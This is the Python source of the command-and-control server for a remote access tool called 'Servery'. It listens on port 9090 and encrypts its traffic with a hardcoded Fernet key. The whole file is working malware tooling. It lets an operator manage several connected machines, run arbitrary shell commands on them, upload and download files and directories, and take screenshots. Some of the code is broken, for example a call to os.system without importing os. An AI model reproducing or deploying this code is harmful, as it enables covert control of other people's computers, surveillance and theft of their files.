from __future__ import print_function
from cryptography.fernet import Fernet
from time import sleep
from os import remove, system
from shutil import make_archive
from socket import socket, error
from threading import Thread


all_connections = []
all_addresses = []
all_responces = []
found = []
status_servery = True
key = "jwtU6dABBShoW0T6PGQP7d5mZDZjEUezwrDRmgjXr-g="
cipher_suite = Fernet(key)


# Function used for encrypting command
# Remember that encryption with incresae data size more than half
def encrypt_cmd(cmd):
    return cipher_suite.encrypt(cmd)


# Function used for decrypting command
def decrypt_response(response):
    return cipher_suite.decrypt(response)


# Function used for adding header to data which tells
# that what is length of comming data
# format == [length of data under 10] + encrpted command
# It means you can send 9999999999 bytes or 9.9 GB of data
# For large data you can change size in my case it is 10
# If you change size then don't forget to change this size in server side script
# And also don't forget to change in "recvall()" function
def add_header(data):
    data = encrypt_cmd(data)
    data = "{:<10}".format(len(data)) + data
    return data


# Function used for receiving all comming data using header
# Please set data_part receiving bytes upto 10 bytes
# so header can completely receive in my case it is "1024" bytes
def recvall(conn):
    new_data = True
    data = ""
    while True:
        data_part = conn.recv(1024)
        if new_data:
            data_len = int(data_part[:10])
            data_part = data_part[10:]
            new_data = False
        data += data_part
        if len(data) == data_len:
            break
    return decrypt_response(data)


# Just for printing
def input_check():
    print("Check your input")


# This is main funcion used for listening, sending and displaying received data
# This function will bind and listen for connections
def bind_socket():
    global s
    s = socket()
    host = ""
    port = 9090
    s.bind((host, port))
    s.listen(5)
    # print("Listening ......")


# This function will accept connections
def accept_conn():
    bind_socket()
    while True:
        conn, address = s.accept()
        s.setblocking(1)  # prevents timeout
        all_connections.append(conn)
        all_addresses.append(address)
        if status_servery:
            name = "Servery($) "
            print("Found " + str(address) + "\n" + name, end="")
        else:
            name = "> "
            found.append("Found " + str(address) + "\n")
        ##############################
        # To print all connections after leav or exit
        ##############################
        ##############################
        # For message at new connection
        """
        data = "@echo off\nmsg * Found " + str(address)
        open("test.bat", "w").write(data)
        system("test.bat")
        """
        ##############################
        # print("Found " + str(address) + "\n" + name, end="")
        ###################################
        # For receiving some information about devise
        all_responces.append(recvall(conn))
        ###################################


Thread(target=accept_conn).start()


# To get list and delete unconnected clients from list of connections
def list_conn():
	run = True
	while run:
		if not all_addresses:
			break
		for i, address in enumerate(all_addresses):
			try:
				all_connections[i].send(add_header("a"))
				recvall(all_connections[i])
				run = False
			except error:
				del all_connections[i]
				del all_addresses[i]
				del all_responces[i]
				run = True
				break


# servery is CLI (Command Line Interface) to controlling multi-connections
def servery():
	while True:
		cmd = raw_input("Servery($) ")
		if cmd == "list":
			list_conn()
			for i, address in enumerate(all_addresses):
				print(str(i+1), address)
		elif ("use " in cmd) and (cmd[4:].isdigit()) and (0 < int(cmd[4:]) <= len(all_addresses)):
			cmd = int(cmd[4:]) - 1
			print(all_responces[cmd], end="")
			connection(all_connections[cmd])
		elif "listen" in cmd:
			cmd = cmd[7:].split(":")
			print(cmd)
		elif "close" in cmd:
			try:
				for i in all_connections:
					i.send(add_header("close()"))
			except error:
				pass
			print("All connections have been closed")
		elif ("cls" in cmd) or ("clear" in cmd):
			os.system("cls")


# Just for printing
def input_check():
    print("Check your input")


# This is main funcion used for sending and displaying received data
def connection(conn):
    def leave_close():
        status_servery = True
        for i in found:
            print(i)
        del found[:]
    global status_servery
    status_servery = False
    x = 0
    while True:
        cmd = (raw_input("> "))
        if cmd[:9] == "uploaddir":
            dir_name = cmd[11:].split(",,")
            if len(dir_name) == 2:
                try:
                    print("Making archive of directory " + dir_name[0])
                    archive = make_archive(dir_name[0], 'zip', dir_name[0])
                    data = open(archive, "rb").read()
                    remove(archive)
                    print("Sending")
                    file_data = (cmd[:9] + dir_name[1] + "||=shail=||" + data)
                    file_data = add_header(file_data)
                    conn.send(file_data)
                    print("File sended and wating for response ...")
                    response = recvall(conn)
                    print(response, end="")
                except (IOError, WindowsError):
                    print("Not Any File Found in server")
            else:
                input_check()
        elif cmd[:6] == "upload":
            file = cmd[8:].split(",,")
            if len(file) == 2:
                try:
                    print("Reading file " + file[0])
                    with open(file[0], "rb") as f:
                        data = f.read()
                    print("Reading file complete")
                    file_data = (cmd[:6] + file[1] + "||=shail=||" + data)
                    print("sending")
                    file_data = add_header(file_data)
                    conn.send(file_data)
                    print("File sended and wating for response ...")
                    response = recvall(conn)
                    print(response, end="")
                except IOError:
                    print("Not Any File Found in server")
            else:
                input_check()
        elif cmd[:11] == "downloaddir":
            dir_name = cmd[13:].split(",,")
            if len(dir_name) == 2:
                file_data = add_header(cmd[:11] + dir_name[0])
                conn.send(file_data)
                print("Request sended ...")
                data = recvall(conn)
                data = data.split("||=shail=||")
                if data[0] == "not found":
                    print("Not Any File Found ...")
                else:
                    try:
                        open((dir_name[1] + "_downloaded.zip"), "wb").write(data[0])
                        print("Directory has been received")
                    except IOError:
                        print("No such file or directory in server")
                print(data[1], end="")
            else:
                input_check()
        elif cmd[:8] == "download":
            file = cmd[10:].split(",,")
            if len(file) == 2:
                file_data = (cmd[:8] + file[0])
                file_data = add_header(file_data)
                conn.send(file_data)
                data = recvall(conn)
                data = data.split("||=shail=||")
                if data[0] == "not found":
                    print("Not Any File Found ...")
                else:
                    try:
                        with open(file[1], "wb") as f:
                            f.write(data[0])
                            print("File Has Been Received")
                    except IOError:
                        print("No such file or directory ...")
                print(data[1], end="")
            else:
                input_check()
        elif cmd[:10] == "screenshot":
            cmd = cmd.split(",,")
            if len(cmd) == 2:
                cmd, shot_path = cmd
                shot_path = shot_path + ".png"
                cmd = add_header(cmd)
                conn.send(cmd)
                response = recvall(conn)
                response = response
                shot, cwd = response.split("||=shail=||")
                with open(shot_path, "wb") as f:
                    f.write(shot)
                    x += 1
                print("Screenshot Saved In " + shot_path)
                print(cwd, end="")
            else:
                input_check()
        elif cmd == "close":
            conn.send(add_header("close()"))
            conn.close()
            print("Connection closed with it")
            leave_close()
            break
        elif cmd == "leave":
            leave_close()
            break
        elif len(cmd) > 0:
            cmd = add_header(cmd)
            conn.send(cmd)
            response = recvall(conn)
            print(response, end="")


# This is used to start listening for conections again and again if any error occured
while True:
    try:
        servery()
    except error as msg:
        sleep(1)
        print(msg)
        print("Retrying ...")
